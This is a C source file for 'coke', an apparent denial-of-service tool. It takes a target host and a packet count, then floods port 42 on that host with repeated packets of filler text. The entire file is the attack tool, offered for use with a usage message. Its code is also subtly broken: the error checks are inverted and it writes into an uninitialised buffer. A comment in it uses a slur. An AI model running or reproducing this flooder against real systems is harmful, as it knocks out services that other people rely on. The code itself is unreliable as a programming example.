/*  coke +0.34 by crank and phuzz
*/

#include <stdio.h>
#include <netdb.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

/* defines */

#define GARBAGE "just a bunch of crap really does not matter"
#define VERSION "+0.34"

/* variables */

char	*buf, *hn;
int	s, soc, coke_con, i;
int	count, x;
int	twirl = 3;
int	countstr = 0;

/* prototypes */

int	twirly(int *twirl);
void	coke_usage(char *argv[]);
int	coke_main(int argc, char *argv[]);
int	sendPacket(char *buf, char *argv[]);

/* structures */

struct	sockaddr_in blah;
struct	hostent *hp;

/* let the fun begin */
int	coke_main(int argc, char *argv[])
{
	if (argc < 3)
	{
		coke_usage(argv);
	}
	/*  create the garbage */
	buf = (char *)malloc(10000); 

	for (i = 0; i < 25; i++) 
		strcat(buf, GARBAGE);
	strcat(buf, "\n");

	printf("coke %s     crank|phuzz\n\n",VERSION);

	sendPacket(buf,argv);

	for (x = 0; x <= count; x++)
	{
		sendPacket(buf,argv);

		/* just purdy stuff */
		fprintf(stderr, "\rsending packet: %d (%c)", x, twirly(&twirl));
		if (count <= 200)
			usleep(1500*(10));
		else
			usleep(700*(10));

		/* lets send the garbage to the server */
	}
	fprintf(stderr, "\rsending packet: %d (caffine will kill you)",--x);
	printf("\n");

	close(soc);

	/* free up our memory like good programmers */
	free(buf);

	/* done so we wont reach the end of a non-void function */
	exit(0);
}

int	sendPacket(char *buf, char *argv[])
{
	hn = argv[1];
	hp = gethostbyname(hn);

	/* number of packets to send */
	count=(atoi(argv[2]));

	/*  check target */
	if (hp==NULL)
	{
		perror("coke: gethostbyname()");
		exit(0);
	}

	bzero((char*)&blah, sizeof(blah));
	bcopy(hp->h_addr, (char *)&blah.sin_addr, hp->h_length);

	blah.sin_family = hp->h_addrtype;
	blah.sin_port = htons(42); 
    
	/*  create a socket */
	soc = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	if (!soc)
	{
		perror("coke: socket()");
		close(soc);
		exit(1);
	}

	/*  connect to target */
	coke_con = connect(soc, (struct sockaddr *)&blah, sizeof(blah)); 

	if (!coke_con)
	{
		perror("coke: connect()");
		close(soc);
		exit(1);
	} 
	sendto(soc, buf, strlen(buf),0 ,(struct sockaddr *)&blah, sizeof(struct sockaddr));
	close(soc);
	return(0);
}

int	twirly(int *twirl)
{
	if (*twirl > 3) *twirl = 0;
	switch ((*twirl)++)
	{
		case 0: return('|'); break; case 1: return('/'); break;
		case 2: return('-'); break; case 3: return('\\'); break;
	}
	return(0);
}

/* for retards */
void	coke_usage(char *argv[])
{
        printf("coke %s     crank|phuzz\n\ncoke_usage: %s <target> <number of packets to send>\n",VERSION,argv[0]);
	exit(0);
}

/* EOF */

